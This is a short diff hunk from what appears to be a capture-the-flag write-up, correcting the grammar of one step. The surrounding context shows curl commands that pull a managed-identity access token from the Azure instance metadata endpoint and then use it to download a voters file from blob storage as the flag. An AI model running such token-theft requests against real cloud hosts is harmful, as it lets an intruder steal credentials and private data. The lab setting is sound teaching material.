@@ -46,7 +46,7 @@ And once you get the connection, use `curl` to get an access token:
 ```
 curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fstorage.azure.com%2F' -H Metadata:true
 ```
-- Once you have an access token you can use to make this request for the file and get the flag:
+- Once you have an access token, you can use it to make this request for the file and get the flag:
 ```
 curl "https://rgnl2025voteremailer.blob.core.windows.net/voters/voters.txt" \
   -H "x-ms-version: 2017-11-09" \
